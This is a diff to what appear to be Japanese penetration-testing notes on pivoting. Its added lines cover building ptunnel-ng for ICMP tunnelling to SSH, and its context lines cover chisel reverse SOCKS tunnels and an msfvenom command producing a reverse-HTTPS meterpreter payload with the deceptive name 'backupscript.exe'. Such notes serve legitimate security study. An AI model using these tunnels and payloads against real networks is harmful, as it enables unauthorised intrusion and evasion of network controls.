@@ -20,6 +20,22 @@ scp chisel <user name>@<pivot IP>:~/ #pivotホストにchiselを配送する
 sudo ./chisel server --reverse -v -p <port> --socks5 #kaliでサーバを起動（リバース）
 ./chisel client -v <kali IP>:<port> R:socks #pivotホストからkaliへ接続（リバース）
 
+//ptunnel-ng(ICMPを利用してトンネリングできる）
+sudo apt install ptunnel-ng
+# 1. 依存関係のインストール (Debian/Ubuntu系の場合)
+sudo apt install git automake libtool make gcc
+# 2. クローンとビルド
+git clone https://github.com/lnsl/ptunnel-ng.git
+cd ptunnel-ng
+./autogen.sh
+CFLAGS="-static" LDFLAGS="-static" ./configure
+make
+# 完了すると src ディレクトリ内に ptunnel-ng の実行ファイルができます
+
+sudo ./ptunnel-ng -r<pivot IP> -R22 #pivotホストで
+sudo ./ptunnel-ng -p<pivot IP> -l2222 -r<pivot IP> -R 22 #kaliから接続
+このあとSSHのダイナミックポートフォワードを併用する
+
 //meterpreter
 <踏み台を経由したmeterpreterセッションの確立の流れ>
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=<踏み台IP> lport=<踏み台port> -f exe -o backupscript.exe　#ピボット先のホストで動かすexe
